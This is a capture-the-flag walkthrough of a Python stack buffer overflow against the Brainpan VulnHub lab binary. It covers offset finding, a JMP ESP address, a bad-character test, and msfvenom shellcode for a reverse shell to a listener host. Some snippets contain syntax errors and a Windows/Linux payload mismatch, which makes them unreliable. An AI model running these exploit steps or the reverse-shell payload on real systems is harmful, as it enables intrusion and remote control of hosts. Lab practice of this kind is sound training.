VulnHub Machines Walkthrough
Brainpan – Part 1


Let's Start With Nmap 
1. nmap -sC -sV 172.16.229.134

   Nmap Result Shows port 9999, and http running on 10000 


2. dirbuster found:

   http://172.16.229.134:10000/bin/

   Found brainpan.exe, load into windows xp lab machine, expects a connection to port 9999..

   Break with immunity on windows debug machine, find password, port to linux, exploit on port 9999 on brainpan server

   Btw, password seems to be "shitstorm", found with strings
   
   "strings brainpan.exe"


3. We can cause a crash with 1000 A's after "shitstorm"
   

   #!/usr/bin/python
   import socket

   s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   s.connect(('172.16.229.134', 9999))

   print  s.recv(1024)
   buffer="A"*1000
   s.send(buffer)
   s.recv(1024)
   s.close()


4. To find the exact offset at which the current buffer of As are overwriting EIP, let’s use the pattern created from Kali


   #!/usr/bin/python
   import socket

   s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   s.connect(('172.16.229.134', 9999))

   print  s.recv(1024)
   buffer="Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9"
   s.send(buffer)
   s.recv(1024)
   s.close()


5. New buffer has overwritten EIP at location 35724134.

   Using the pattern offset from Kali, the offset position is found to be 524.
   
   "/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 35724134"


6. As per the offset position found, let’s try to recreate our buffer

   
   #!/usr/bin/python
   import socket

   s=socket.socket(socket.AF_INET, socket.SOCK_STREAM
   s.connect(('172.16.229.134', 9999))

   print  s.recv(1024)
   buffer="A"*524+"B"4
   s.send(buffer)
   s.recv(1024)
   s.close()


7. Now we can control this location and use it to point to our buffer. We are going to place our malicious buffer in ESP, so we need an instruction such as JMP ESP to be placed in EIP so that it points to our buffer.

   In order to overwrite the Bs with a constant location, we will use mona modules and locate the module which does not have flags such as ASLR.

   brainpan.exe itself has all the flags turned off.

   "!mona modules"

   Looking further into the brainpan.exe, we found out that there is an instruction JMP ESP in the module brainpan.

   Now we have the instruction address 0x311712F3.


8. Now we h ave to find Bad char to find Bad char 

   #!/usr/bin/python
   import socket

   s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   s.connect(('172.16.229.134', 9999))

   print  s.recv(1024)
   buffer="\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
   "\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
   "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
   "\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
   "\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
   "\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
   "\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
   "\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
   s.send(buffer)
   s.recv(1024)
   s.close() 


   We observe the output carefully by looking into the contents of the ESP register, we can see that the ‘\x00’ is the bad char


9. Now we have all the points collected to exploit the buffer overflow. We just need to create the payload now to get the reverse shell back

   Below, we use msfvenom to generate the Windows reverse shell.

   msfvenom -p linux/x86/shell_reverse_tcp LHOST=172.16.229.135 LPORT=444 --smallest -b '\x00' -f python -v shellcode
   shellcode =  ""
   shellcode += "\x6a\x43\x59\xe8\xff\xff\xff\xff\xc1\x5e\x30\x4c"
   shellcode += "\x0e\x07\xe2\xfa\x30\xd9\xf4\xe7\x56\x45\x54\x62"
   shellcode += "\x0b\x83\xea\xbc\x6b\xc3\x8f\x83\x48\xa2\x2c\xd9"
   shellcode += "\x95\x5f\x6e\xe1\x71\xb6\x0b\xf9\x9a\x76\x1d\x20"
   shellcode += "\x20\x9e\xaa\xc5\x95\x40\x77\x79\x7a\x99\x28\xa5"
   shellcode += "\xcc\xe3\xaf\x62\x59\x5c\x1c\x47\x5d\x5e\x18\x17"
   shellcode += "\x5b\x53\xb2\xdf\x6f\x6d\xb6\xa1\xf1\x49\x8e\xc4"

   
   #!/usr/bin/python
   import socket

   s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   s.connect(('172.16.229.134', 9999))

   print  s.recv(1024)
   buffer="A"*524
   eip="\xF3\x12\x17\x31"
   shellcode =  ""
   shellcode += "\x6a\x43\x59\xe8\xff\xff\xff\xff\xc1\x5e\x30\x4c"
   shellcode += "\x0e\x07\xe2\xfa\x30\xd9\xf4\xe7\x56\x45\x54\x62"
   shellcode += "\x0b\x83\xea\xbc\x6b\xc3\x8f\x83\x48\xa2\x2c\xd9"
   shellcode += "\x95\x5f\x6e\xe1\x71\xb6\x0b\xf9\x9a\x76\x1d\x20"
   shellcode += "\x20\x9e\xaa\xc5\x95\x40\x77\x79\x7a\x99\x28\xa5"
   shellcode += "\xcc\xe3\xaf\x62\x59\x5c\x1c\x47\x5d\x5e\x18\x17"
   shellcode += "\x5b\x53\xb2\xdf\x6f\x6d\xb6\xa1\xf1\x49\x8e\xc4"
   s.send(buffer+eip+shellcode)
   s.recv(1024)
   s.close()


10.Now Run The Code and Start The Listner on port 444
   And We get The Reverse Shell From Our BrainPain Machine..............


 
